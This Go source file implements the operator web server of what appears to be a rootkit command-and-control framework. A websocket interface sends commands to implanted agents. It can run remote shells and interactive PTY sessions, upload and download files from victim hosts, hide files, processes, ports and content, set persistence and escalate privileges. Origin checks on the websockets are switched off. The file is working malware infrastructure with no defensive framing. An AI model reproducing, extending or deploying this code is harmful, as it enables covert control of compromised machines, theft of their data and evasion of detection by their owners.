package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/coder/websocket"
)

type webMessage struct {
	Type, Target, Command, Path, Label, Data string
	ExecID                                   int `json:"_execId"`
	DLID                                     int `json:"_dlId"`
	UploadID                                 int `json:"_uploadId"`
}

var commandCatalog = []map[string]string{
	{"cmd": "PING", "desc": "Check agent connectivity"},
	{"cmd": "STATUS", "desc": "Show process identity"},
	{"cmd": "SHELL <command>", "desc": "Execute a command"},
	{"cmd": "HIDE FILE <name>", "desc": "Conceal a directory entry"},
	{"cmd": "HIDE PID <pid>", "desc": "Conceal a process"},
	{"cmd": "HIDE PORT <port>", "desc": "Conceal a procfs TCP entry"},
	{"cmd": "HIDE CONTENT <text>", "desc": "Filter matching read lines"},
	{"cmd": "PERSIST", "desc": "Enable persistence"},
	{"cmd": "UNPERSIST", "desc": "Disable persistence"},
	{"cmd": "ESCALATE [pid]", "desc": "Escalate a process"},
}

func (o *Operator) startWeb(ctx context.Context) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /ws", o.handleWS)
	mux.HandleFunc("GET /shell", o.handleShellWS)
	mux.Handle("GET /", spaHandler(os.Getenv("RKLINGS_WEB_DIR")))

	srv := &http.Server{
		Addr:         o.webAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	go func() {
		<-ctx.Done()
		srv.Shutdown(context.Background())
	}()
	if err := srv.ListenAndServe(); err != http.ErrServerClosed {
		slog.Error("webapp", "err", err)
	}
}

func spaHandler(root string) http.Handler {
	files := http.FileServer(http.Dir(root))
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := filepath.Join(root, filepath.Clean(r.URL.Path))
		if info, err := os.Stat(path); err == nil && !info.IsDir() {
			files.ServeHTTP(w, r)
			return
		}
		http.ServeFile(w, r, filepath.Join(root, "index.html"))
	})
}

func (o *Operator) handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return
	}
	defer ws.CloseNow()

	send := make(chan any, 64)
	done := make(chan struct{})
	go func() {
		defer close(done)
		for v := range send {
			data, _ := json.Marshal(v)
			if ws.Write(context.Background(), websocket.MessageText, data) != nil {
				return
			}
		}
	}()
	wsWrite := func(v any) {
		select {
		case send <- v:
		case <-done:
		}
	}

	wsWrite(o.statePayload())

	evCh, unsub := o.Events.Subscribe(64)
	defer unsub()
	go func() {
		for ev := range evCh {
			wsWrite(map[string]any{
				"type":  "event",
				"kind":  ev.Kind,
				"agent": ev.Agent,
				"msg":   ev.Message,
				"time":  ev.Time.Format(time.RFC3339),
			})
		}
	}()

	for {
		_, data, err := ws.Read(context.Background())
		if err != nil {
			close(send)
			return
		}
		var msg webMessage
		if json.Unmarshal(data, &msg) != nil {
			continue
		}
		switch msg.Type {
		case "heartbeat", "watch":
		case "refresh":
			wsWrite(o.statePayload())
		case "rename":
			if l := strings.TrimSpace(msg.Label); l != "" && o.Store != nil {
				_ = o.Store.PutLabel(msg.Target, l)
			}
			wsWrite(o.statePayload())
		case "command":
			cmdOp, cmdArg, _ := strings.Cut(msg.Command, " ")
			raw, callErr := o.SendCommand(msg.Target, cmdOp, cmdArg)
			reply := rawToString(raw)
			o.PublishEvent(Event{Kind: "command", Message: msg.Command})
			wsWrite(map[string]any{"type": "result", "target": msg.Target, "command": msg.Command, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": resultStr(reply, callErr)})
		case "exec":
			raw, callErr := o.SendCommand(msg.Target, "SHELL", msg.Command)
			output := ""
			if callErr != nil {
				output = callErr.Error()
			} else {
				sr := parseShellResultRaw(raw)
				output = sr.stdout
				if sr.stderr != "" {
					output += sr.stderr
				}
			}
			wsWrite(map[string]any{"type": "exec_result", "target": msg.Target, "_execId": msg.ExecID, "ok": callErr == nil, "output": output})
		case "download":
			data, dlErr := o.SendDownload(msg.Target, msg.Path)
			if dlErr != nil {
				wsWrite(map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": false, "error": dlErr.Error()})
			} else {
				b64 := base64.StdEncoding.EncodeToString(data)
				wsWrite(map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": true, "size": len(data), "data": b64})
			}
		case "upload":
			data, decodeErr := base64.StdEncoding.DecodeString(msg.Data)
			if decodeErr != nil || len(data) > 16<<20 {
				wsWrite(map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": false, "error": "invalid upload"})
				continue
			}
			uploadPayload, _ := json.Marshal(map[string]string{
				"path": msg.Path,
				"data": base64.StdEncoding.EncodeToString(data),
			})
			raw, callErr := o.SendCommand(msg.Target, "UPLOAD", "", WithData(uploadPayload))
			reply := rawToString(raw)
			wsWrite(map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": resultStr(reply, callErr), "size": len(data)})
		}
	}
}

func (o *Operator) handleShellWS(w http.ResponseWriter, r *http.Request) {
	ws, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return
	}
	defer ws.CloseNow()

	target := r.URL.Query().Get("target")
	session, err := o.Agents.get(target)
	if err != nil {
		writeJSON(ws, map[string]any{"type": "error", "msg": "target offline"})
		return
	}
	raw, err := o.SendCommand(target, "PTY", "START")
	if err != nil {
		writeJSON(ws, map[string]any{"type": "error", "msg": err.Error()})
		return
	}
	if strings.HasPrefix(rawToString(raw), "ERR") {
		writeJSON(ws, map[string]any{"type": "error", "msg": rawToString(raw)})
		return
	}
	defer o.SendCommand(target, "PTY", "CLOSE")
	writeJSON(ws, map[string]any{"type": "ready"})

	ptyCh := make(chan []byte, 64)
	session.ptyMu.Lock()
	session.ptySub = ptyCh
	session.ptyMu.Unlock()
	defer func() {
		session.ptyMu.Lock()
		session.ptySub = nil
		session.ptyMu.Unlock()
	}()

	go func() {
		for data := range ptyCh {
			if ws.Write(context.Background(), websocket.MessageBinary, data) != nil {
				return
			}
		}
	}()

	for {
		kind, data, err := ws.Read(context.Background())
		if err != nil {
			return
		}
		if kind == websocket.MessageText && len(data) > 0 && data[0] == '{' {
			var resize struct {
				Type       string
				Cols, Rows uint16
			}
			if json.Unmarshal(data, &resize) == nil && resize.Type == "resize" {
				o.SendCommand(target, "PTY", fmt.Sprintf("RESIZE %d %d", resize.Cols, resize.Rows))
				continue
			}
		}
		o.SendCommand(target, "PTY", "INPUT "+base64.StdEncoding.EncodeToString(data))
	}
}

func (o *Operator) statePayload() map[string]any {
	sessions, _ := o.Agents.snapshot()

	var labels map[string]string
	if o.Store != nil {
		labels, _ = o.Store.GetLabels()
	}
	if labels == nil {
		labels = make(map[string]string)
	}

	var events []map[string]string
	if o.Store != nil {
		entries, _ := o.Store.RecentAudit(200)
		events = make([]map[string]string, 0, len(entries))
		for _, e := range entries {
			events = append(events, map[string]string{
				"time":  e.Time,
				"type":  e.Kind,
				"msg":   e.Message,
				"agent": e.Agent,
			})
		}
	}

	targets := []map[string]any{}
	for _, session := range sessions {
		id := session.id
		label := labels[id]
		if label == "" {
			label = id
		}

		info := agentInfo{Hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}
		online := true
		o.stateMu.RLock()
		if cached, ok := o.agentState[id]; ok {
			info = cached.Info
			online = cached.Online
			if info.Hidden == nil {
				info.Hidden = map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}
			}
		}
		o.stateMu.RUnlock()

		counts := make(map[string]int, len(info.Hidden))
		for kind, values := range info.Hidden {
			key := kind + "s"
			if kind == "content" {
				key = kind
			}
			counts[key] = len(values)
		}
		targets = append(targets, map[string]any{
			"id": id, "label": label, "hostname": info.Hostname,
			"kernel": info.Kernel, "arch": info.Arch, "pid": info.PID, "uid": info.UID,
			"online": online, "remote_addr": session.remoteAddr,
			"module_hidden": info.ModuleHidden, "persisted": info.Persisted,
			"hidden": info.Hidden, "counts": counts,
			"last_seen": time.Now().Format(time.RFC3339),
		})
	}
	o.Agents.mu.RLock()
	connectCount := o.Agents.connectCount
	o.Agents.mu.RUnlock()
	return map[string]any{"type": "state", "targets": targets, "events": events, "commands": commandCatalog, "connect_count": connectCount}
}

func resultStr(reply string, err error) string {
	if err != nil {
		return err.Error()
	}
	return reply
}

func writeJSON(ws *websocket.Conn, v any) {
	data, _ := json.Marshal(v)
	ws.Write(context.Background(), websocket.MessageText, data)
}
